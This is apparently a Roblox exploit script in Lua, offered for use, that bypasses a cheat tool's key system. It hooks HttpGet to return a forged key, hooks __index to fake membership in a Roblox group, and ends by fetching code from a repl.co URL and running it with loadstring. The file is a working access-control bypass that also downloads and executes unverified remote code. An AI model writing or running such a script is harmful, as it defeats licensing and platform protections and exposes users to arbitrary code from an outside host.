local function Hex(str)
    return (str:gsub('.', function (c)
        return string.format('%02X', string.byte(c)):lower();
    end)):lower()
end
local LocalPlayer = game:GetService("Players").LocalPlayer
local ClientIP = ""; -- set ur ip to anything you want, it doesn't matter.
local SpoofString = tostring(Hex('DONT SHARE UR IP' .. ClientIP .. 'DONT SHARE UR IP'));

local OldHook;
OldHook = replaceclosure(game.HttpGet, function(self, url, ...)
    if url:find('key/main.php') then
        return SpoofString;
    end
    
    return OldHook(self, url, ...)
end)

local oldIdx
oldIdx = hookmetamethod(game, "__index", function(self, method, ...)
    local ret = oldIdx(self, method, ...)
    if method == "IsInGroup" then
        return newcclosure(function(self, groupId, ...)
            warn(groupId, type(groupId))
            if self == LocalPlayer and groupId == 11861898 then
                return true
            end
            return ret(self, groupId, ...)
        end)
    end
    return ret
end)

_G.nexokey = SpoofString
loadstring(game:HttpGet('https://nexo.notxeneon15.repl.co/nexo/main.lua'))()
